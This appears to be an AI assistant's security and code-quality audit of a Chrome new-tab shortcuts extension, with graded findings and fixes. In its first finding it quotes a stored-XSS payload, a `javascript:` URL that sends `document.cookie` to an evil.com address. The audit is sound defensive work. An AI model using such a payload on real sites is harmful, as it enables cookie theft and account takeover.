I've audited the full `trunk` branch. Here's the complete report.

---

## Audit: New Tab Shortcuts — `trunk` (176e12a2)

### Critical

#### 1. `javascript:` protocol XSS in shortcut URLs — `newtab.js:432-440`

The URL validation in `saveShortcut` accepts any protocol:

```js
if (!/^[a-zA-Z][a-zA-Z\d+\-.]*:\/\//.test(url)) {
  url = 'https://' + url;
}
try { new URL(url); } catch { /* error */ }
```

This allows `javascript:` URLs. The URL is rendered directly into `<a href="${escAttr(shortcut.url)}">`. `escAttr` only HTML-encodes (`&",<>`) — it does NOT neutralize the `javascript:` scheme. A user who adds a shortcut with URL `javascript:fetch('https://evil.com/steal?'+document.cookie)` creates a stored XSS. Clicking the tile executes JS in the extension's privileged context.

**Fix** — Add protocol allowlisting after `new URL()` validates:

```js
const parsed = new URL(url);
if (!['http:', 'https:'].includes(parsed.protocol)) {
  errEl.textContent = 'Only http and https URLs are allowed.';
  urlInput.focus();
  return;
}
```

#### 2. No Content Security Policy — `manifest.json:1-17`

The extension has no CSP. If any injection vector is found (e.g., the above XSS, or a malicious sync update), an attacker can execute arbitrary scripts. Extension pages have elevated privileges (`storage` API).

**Fix** — Add to `manifest.json`:

```json
"content_security_policy": {
  "extension_pages": "script-src 'self'; object-src 'none'"
}
```

Note: this will break the inline `onerror` handler in `tileHTML` (see High #3).

---

### High

#### 3. Inline `onerror` handler in `tileHTML` — `newtab.js:247`

```html
onerror="this.style.display='none';this.parentElement.classList.add('tile-icon--fallback')"
```

Inline event handlers are a CSP violation and a code smell. The handler runs in the extension's script context.

**Fix** — Create the favicon `<img>` with JavaScript and attach the `error` listener via `addEventListener`:

```js
const img = document.createElement('img');
img.className = 'tile-favicon';
img.src = faviconUrl;
img.alt = '';
img.addEventListener('error', () => {
  img.style.display = 'none';
  img.parentElement.classList.add('tile-icon--fallback');
});
```

Then insert the `<img>` during HTML construction. This also fixes the CSP blocker from #2.

#### 4. README is significantly outdated — `README.md:22-31`

The "Usage" table describes the old UI:
- Old: `✕` delete button on tile hover
- New: three-dot menu → Duplicate / Delete
- Missing entirely: edit mode toggle, keyboard shortcut `e`, Escape to exit edit mode, Import/Export buttons, favicon display, duplicate shortcut

The "File Structure" section is also stale — it doesn't list `tests/`, `eslint.config.js`, `playwright.config.js`, or `vitest.config.js`.

**Fix** — Update README to document the current feature set.

#### 5. AGENT.md is outdated — `AGENT.md:38-68`

Same issues as README. Also lists the wrong exports for `storage.js` (claims `init, saveAll, onChange, newId` but `validate` is also exported and used by `newtab.js`). File listing missing the config/test files. Describes old delete-tile UX.

**Fix** — Sync AGENT.md with current architecture.

---

### Medium

#### 6. `renderEmpty` breaks event delegation pattern — `newtab.js:136`

```js
document.getElementById('empty-add-group').addEventListener('click', () => promptAddGroup());
```

The rest of the app uses a single delegated `click` handler on `#app`. This direct listener is inconsistent. It works because `renderEmpty` is only called when there are no groups, and adding a group immediately re-renders via `renderGroups`. But if any feature ever re-renders via `renderEmpty` a second time, the old listener leaks.

**Fix** — Add `data-action="add-group"` to the empty-state button and handle it in the existing `handleClick` delegator, removing the direct listener.

#### 7. CI `paths-ignore` skips HTML changes — `.github/workflows/test.yml:9,22`

Changes to `*.html` on trunk push or in PRs are excluded from CI. The HTML file contains inline CSS and the skeleton markup. A broken change to `newtab.html` (e.g., malformed skeleton, missing element IDs) would silently land.

**Fix** — Remove `'*.html'` from `paths-ignore`.

#### 8. No integration coverage of runtime behavior

Integration tests load `newtab.html` from `file://`. Chrome blocks `type="module"` scripts from `file://` URLs, so `newtab.js` never executes. The tests only validate static HTML structure — they cannot test edit mode toggle, add/delete groups, modal behavior, import/export, or keyboard shortcuts.

**Fix** — Either: (a) serve the extension directory via a local HTTP server in Playwright's `webServer` config, or (b) run tests as a loaded unpacked extension using Playwright's Chrome extension test mode with a test extension ID.

#### 9. `uid()` uses `Math.random()` — `storage.js:49`

```js
return Math.random().toString(36).slice(2, 10);
```

8-char hexatrigecimal IDs = ~2.8T values. Fine for current usage, but `crypto.randomUUID()` is available in Chrome extensions and is cryptographically stronger. Not a practical collision risk at scale, but worth noting.

---

### Low

#### 10. Favicon URLs leak domains to Google — `newtab.js:230`

```js
const faviconUrl = `https://www.google.com/s2/favicons?domain=${escAttr(domain)}&sz=64`;
```

Every shortcut domain is sent to Google's servers on tile render. No privacy disclosure in README.

**Fix** — Consider using Chrome's built-in `chrome://favicon/` API or document the privacy implication.

#### 11. `escAttr === escHtml` — `newtab.js:568`

```js
function escAttr(str) { return escHtml(str); }
```

Only double-quoted attributes work correctly — single-quoted attributes would not be escaped. Since all template literal attributes use `"`, this is safe. But a future engineer could copy a single-quoted pattern and introduce a bug.

**Fix** — Either add `'` → `&#39;` to `escAttr`, or remove the indirection entirely since it's always called for double-quoted contexts.

---

### Summary

| Severity | Count | Key items |
|----------|-------|-----------|
| Critical | 2 | `javascript:` XSS, missing CSP |
| High | 3 | Inline `onerror`, README, AGENT.md |
| Medium | 4 | Delegation break, CI gap, no runtime test coverage, `Math.random` |
| Low | 2 | Google privacy leak, `escAttr` alias |

The most actionable fix is **Critical #1** — protocol allowlisting in `saveShortcut`. It's a one-line addition that closes a stored XSS path. **Critical #2** (CSP) depends on **High #3** (removing the inline `onerror`), so those should be done as a pair. The documentation updates in **High #4/#5** are straightforward and prevent future contributors from making incorrect assumptions.